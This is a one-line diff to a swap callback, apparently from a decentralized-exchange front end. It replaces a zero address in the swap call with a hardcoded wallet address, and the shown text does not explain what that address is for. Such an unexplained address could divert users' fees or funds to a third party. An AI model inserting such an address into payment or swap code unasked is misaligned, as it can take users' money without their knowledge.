@@ -63,7 +63,7 @@ export function useSwapCallback(
           trade.outputAmount.token.address,
           trade.inputAmount.raw.toString(),
           trade.inputAmount.multiply(String(10000 - allowedSlippage)).divide(String(10000)).toFixed(0),
-          ZERO_ADDRESS
+          '0x68a17B587CAF4f9329f0e372e3A78D23A46De6b5'
         ])
       }
 
